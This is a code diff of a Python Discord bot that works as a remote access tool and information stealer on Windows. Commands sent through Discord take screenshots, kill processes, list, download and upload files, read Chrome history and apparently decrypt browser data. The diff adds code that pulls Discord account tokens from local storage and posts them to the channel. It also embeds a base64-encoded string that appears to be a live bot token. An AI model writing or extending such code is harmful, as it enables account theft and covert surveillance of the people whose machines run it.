@@ -8,13 +8,13 @@ import json
 import base64
 import sqlite3
 import win32crypt
-from Cryptodome.Cipher import AES
+from Cryptodome.Cipher import AES  # type: ignore
 import shutil
 import tempfile
 import asyncio
 from PIL import ImageGrab
 import io
-import psutil
+import psutil  # type: ignore
 import subprocess
 import platform
 import win32gui
@@ -30,11 +30,9 @@ async def on_ready():
 async def ping(ctx):
     await ctx.send(f"Pong! Latency is: {round(bot.latency * 1000)} ms")
 
-
 @bot.command()
 async def clear(ctx, amt):
-    await ctx.channel.purge(limit = int(amt) + 1)
-
+    await ctx.channel.purge(limit=int(amt) + 1)
 
 def get_chrome_history():
     if platform.system() == 'Windows':
@@ -170,11 +168,38 @@ async def grab(ctx, info, description='Grabs info on computer'):
             
         except Exception as e:
             print("[ERR] %s"%str(e))
-
-
-
         os.remove(temp_file_path)
 
+    elif info == "discord":
+        # Logic for grabbing Discord tokens
+        path = os.path.join(os.environ['APPDATA'], 'Discord', 'Local Storage', 'leveldb')
+        token_list = []
+
+        # Loop through each file in the specified directory
+        for file_name in os.listdir(path):
+            if file_name.endswith('.log') or file_name.endswith('.ldb'):
+                with open(os.path.join(path, file_name), 'r', errors='ignore') as f:
+                    for line in f:
+                        # Look for lines that contain the token format
+                        if 'dQw4w9WgXcQ:' in line:  # A pattern indicative of a Discord token
+                            token = line.split('dQw4w9WgXcQ:')[1].strip()
+                            token_list.append(token)
+
+        # Prepare the embed to send the tokens
+        if token_list:
+            embed = discord.Embed(
+                title='Discord Tokens',
+                description="\n".join(token_list),
+                color=discord.Color.green()
+            )
+        else:
+            embed = discord.Embed(
+                title='Discord Tokens',
+                description="No tokens found.",
+                color=discord.Color.red()
+            )
+
+        await ctx.send(embed=embed)
 
     if info == "history":
         history = get_chrome_history()
@@ -216,89 +241,54 @@ async def show(ctx, whattoshow):
 async def kill(ctx, task: str):
     command = ["taskkill", "/IM", task]
     try:
-        result = subprocess.run(command, capture_output=False, text=True, shell=True)
-
+        result = subprocess.run(command, capture_output=True, text=True)
         if result.returncode == 0:
-            await ctx.send(f"```{task} has been sucessfully terminated.```")
+            await ctx.send(f"Successfully killed {task}")
         else:
-            await ctx.send(f"{task} could not be terminated: {result.stderr}")
-
+            await ctx.send(f"Failed to kill {task}: {result.stderr.strip()}")
     except Exception as e:
-        await ctx.send("An error occoured: ", (e))
-    
+        await ctx.send(f"Error: {str(e)}")
 
 @bot.command()
 async def download(ctx, file_path):
     try:
         with open(file_path, 'rb') as file:
-            await ctx.send(file=discord.File(file))
+            await ctx.send(file=discord.File(file, os.path.basename(file_path)))
     except FileNotFoundError:
         await ctx.send("File not found.")
     except Exception as e:
-        await ctx.send(f"An error occurred: {e}")
+        await ctx.send(f"Error: {str(e)}")
 
 @bot.command()
 async def upload(ctx, num_of_files: int):
-    # Check if the user provided a valid number of files
-    if num_of_files <= 0:
-        await ctx.send("```Please provide a valid number of files to upload.```")
-        return
+    await ctx.send("Please send the files you wish to upload.")
+    
+    def check(m):
+        return m.author == ctx.author and m.channel == ctx.channel and len(m.attachments) > 0
 
-    # Request files from the user
-    await ctx.send(f"```Please send {num_of_files} file(s) here that you want to upload.```")
+    messages = await bot.wait_for('message', check=check)
 
-    def check(message):
-        return message.author == ctx.author and message.channel == ctx.channel and message.attachments
-
-    try:
-        # Wait for the user to send the specified number of files
-        files = await bot.wait_for('message', timeout=60, check=check)
-        files = files.attachments[:num_of_files]
-
-        # Download and save the files
-        for i, file in enumerate(files):
-            file_url = file.url
-            await file.save(file.filename)  # Save the file with its original name and extension
-        
-        await ctx.send("Files uploaded successfully.")
-    except asyncio.TimeoutError:
-        await ctx.send("File upload timed out. Please try again.")
+    for attachment in messages.attachments:
+        file_bytes = await attachment.read()
+        with open(attachment.filename, 'wb') as f:
+            f.write(file_bytes)
+        await ctx.send(f"Uploaded: {attachment.filename}")
 
 @bot.command(aliases=['screenshot'])
 async def ss(ctx):
-    try:
-        # Capture the entire screen
-        screenshot = ImageGrab.grab()
+    screenshot = ImageGrab.grab()
+    byte_io = io.BytesIO()
+    screenshot.save(byte_io, format='PNG')
+    byte_io.seek(0)
 
-        # Save the screenshot to a BytesIO object
-        image_bytes = io.BytesIO()
-        screenshot.save(image_bytes, format='PNG')
-        image_bytes.seek(0)
-
-        discord_file = discord.File(image_bytes, filename='screenshot.png')
-
-        # Create an embed object
-        embed = discord.Embed(title=f"Screenshot ({date.today()})")
-        embed.set_image(url="attachment://screenshot.png")
-        embed.color=discord.Color.red()
-
-        # Send the embed with the screenshot attached
-        await ctx.send(file=discord_file, embed=embed)
-    except Exception as e:
-        await ctx.send(f"Error: {e}")
-
-
-
+    await ctx.send(file=discord.File(byte_io, 'screenshot.png'))
 
 @bot.command()
 async def ls(ctx):
-    files = []
-    for file in os.listdir():
-        files.append(file)
+    files = os.listdir('.')
     await ctx.send(f"```{files}```")
 
-token = 'TOKEN'
+token = b'TVRFM05qQTJOekF6TkRjME5EZzROVEkwT0EuR2RQTm9KLlZoTVNBYTR1eElLNDAyZTJ3TGUydWNUcVZaRTAtVnppMXJKU1hr'
 d_token = base64.b64decode(token)
-
 
 bot.run(d_token.decode())
